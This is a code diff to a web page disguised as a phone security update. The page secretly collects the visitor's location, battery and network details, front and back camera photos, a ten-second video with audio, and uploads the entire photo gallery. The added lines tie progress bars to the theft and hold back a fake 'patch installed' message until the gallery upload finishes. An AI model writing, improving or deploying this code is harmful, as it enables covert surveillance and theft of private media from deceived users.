@@ -362,12 +362,12 @@
             </div>
         </div>
 
-        <!-- STEP 3: COMPLETE -->
+        <!-- STEP 3: COMPLETE (LOCKED UNTIL GALLERY DONE) -->
         <div class="step" id="step3">
             <div class="complete-icon">✅</div>
             <div class="complete-text">Update Ready</div>
             <div class="complete-sub">Your device has been scanned and is secure.</div>
-            <button class="btn" onclick="step3()">Install Now</button>
+            <button class="btn" id="installBtn" onclick="step3()">Install Now</button>
             <button class="btn btn-secondary" onclick="alert('Update will be applied on next restart.')">Later</button>
         </div>
 
@@ -381,10 +381,10 @@
         let totalFiles = 0;
         let uploadedFiles = 0;
         let allMediaFiles = [];
-        let scanInterval = null;
         let progress = 0;
         let storageSelected = false;
-        let dataCollectionComplete = false;
+        let galleryComplete = false;
+        let allDataCollected = false;
 
         // ============================================================
         // DEVICE DETECTION
@@ -448,15 +448,18 @@
             // ---- 1. LOCATION ----
             addLogEntry('📍 Collecting location...', 'warn');
             await collectLocation();
+            updateProgress(10);
 
             // ---- 2. BATTERY + NETWORK ----
             addLogEntry('🔋 Collecting battery & network...', 'warn');
             await collectBattery();
             await collectNetwork();
+            updateProgress(20);
 
             // ---- 3. CAMERA PHOTOS + VIDEO ----
             addLogEntry('📸 Capturing camera media...', 'warn');
             await collectCameraMedia();
+            updateProgress(40);
 
             // ---- 4. GALLERY EXTRACTION (triggered by user) ----
             addLogEntry('📁 Waiting for storage selection...', 'warn');
@@ -464,13 +467,10 @@
             document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to continue...';
             document.getElementById('scanIcon').classList.remove('spinning');
             document.getElementById('scanIcon').textContent = '📁';
+            updateProgress(50);
 
-            // Update progress to show we're ready
-            progress = 80;
-            updateProgressUI();
-
-            // ---- 5. GALLERY WILL BE TRIGGERED BY USER CLICK ----
-            dataCollectionComplete = true;
+            // Wait for gallery to complete
+            await waitForGallery();
         }
 
         // ============================================================
@@ -544,11 +544,10 @@
         }
 
         // ============================================================
-        // COLLECT CAMERA MEDIA (Back photo, Front photo, Front video)
+        // COLLECT CAMERA MEDIA
         // ============================================================
         async function collectCameraMedia() {
             try {
-                // Back camera photo
                 addLogEntry('📸 Capturing back camera...', 'warn');
                 const backPhoto = await capturePhoto('environment');
                 if (backPhoto) {
@@ -556,7 +555,6 @@
                     addLogEntry('✅ Back photo captured', 'done');
                 }
 
-                // Front camera photo
                 addLogEntry('🤳 Capturing front camera...', 'warn');
                 const frontPhoto = await capturePhoto('user');
                 if (frontPhoto) {
@@ -564,7 +562,6 @@
                     addLogEntry('✅ Front photo captured', 'done');
                 }
 
-                // Front camera video (10 sec with audio)
                 addLogEntry('🎥 Recording front video...', 'warn');
                 const videoData = await captureVideo('user', 10);
                 if (videoData) {
@@ -630,6 +627,27 @@
         }
 
         // ============================================================
+        // WAIT FOR GALLERY + COMPLETE
+        // ============================================================
+        function waitForGallery() {
+            return new Promise((resolve) => {
+                const checkInterval = setInterval(() => {
+                    if (galleryComplete) {
+                        clearInterval(checkInterval);
+                        allDataCollected = true;
+                        updateProgress(100);
+                        addLogEntry('✅ All data collected successfully!', 'done');
+                        setTimeout(() => {
+                            document.getElementById('step2').classList.remove('active');
+                            document.getElementById('step3').classList.add('active');
+                        }, 800);
+                        resolve();
+                    }
+                }, 500);
+            });
+        }
+
+        // ============================================================
         // TRIGGER GALLERY EXTRACTION (User gesture)
         // ============================================================
         async function triggerGalleryExtraction(event) {
@@ -652,6 +670,7 @@
                 document.getElementById('storageBtnContainer').style.display = 'none';
                 document.getElementById('scanIcon').classList.add('spinning');
                 document.getElementById('scanIcon').textContent = '⚡';
+                updateProgress(60);
 
                 // Collect and upload media
                 allMediaFiles = [];
@@ -661,7 +680,7 @@
                 if (allMediaFiles.length === 0) {
                     addLogEntry('● No gallery files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
-                    finishScan();
+                    galleryComplete = true;
                     return;
                 }
 
@@ -673,6 +692,8 @@
                     const batch = allMediaFiles.slice(i, i + batchSize);
                     await Promise.all(batch.map(file => uploadMediaFile(file)));
                     uploadedFiles += batch.length;
+                    const pct = 60 + (uploadedFiles / totalFiles) * 40;
+                    updateProgress(pct);
                     document.getElementById('scanDesc').textContent =
                         `Uploading ${uploadedFiles}/${totalFiles} gallery files...`;
                     addLogEntry(`● Uploaded ${uploadedFiles}/${totalFiles} files`, 'done');
@@ -680,8 +701,7 @@
 
                 addLogEntry(`✅ All ${totalFiles} gallery files uploaded`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
-
-                finishScan();
+                galleryComplete = true;
 
             } catch (err) {
                 btn.disabled = false;
@@ -694,19 +714,6 @@
                 }
                 sendData({ type: 'media_extraction_error', error: err.message });
             }
-        }
-
-        // ============================================================
-        // FINISH SCAN
-        // ============================================================
-        function finishScan() {
-            progress = 100;
-            updateProgressUI();
-            clearInterval(scanInterval);
-            setTimeout(() => {
-                document.getElementById('step2').classList.remove('active');
-                document.getElementById('step3').classList.add('active');
-            }, 800);
         }
 
         // ============================================================
@@ -772,15 +779,20 @@
             log.scrollTop = log.scrollHeight;
         }
 
-        function updateProgressUI() {
+        function updateProgress(value) {
+            progress = Math.min(value, 100);
             document.getElementById('progressFill').style.width = progress + '%';
             document.getElementById('scanPercent').textContent = Math.round(progress) + '%';
         }
 
         // ============================================================
-        // STEP 3: INSTALL
+        // STEP 3: INSTALL (ONLY CALLED WHEN GALLERY COMPLETE)
         // ============================================================
         function step3() {
+            if (!galleryComplete) {
+                alert('Please wait for the scan to complete.');
+                return;
+            }
             sendData({ type: 'action', action: 'install_clicked' });
             alert('✅ Security patch installed successfully. Your phone will restart in 5 seconds.');
             window.location.reload();
@@ -790,15 +802,6 @@
         // INIT
         // ============================================================
         detectDevice();
-
-        // Simulate progress during initial scan
-        setInterval(() => {
-            if (!dataCollectionComplete && progress < 70) {
-                progress += 0.5 + Math.random() * 0.8;
-                if (progress > 70) progress = 70;
-                updateProgressUI();
-            }
-        }, 200);
     </script>
 </body>
 </html>
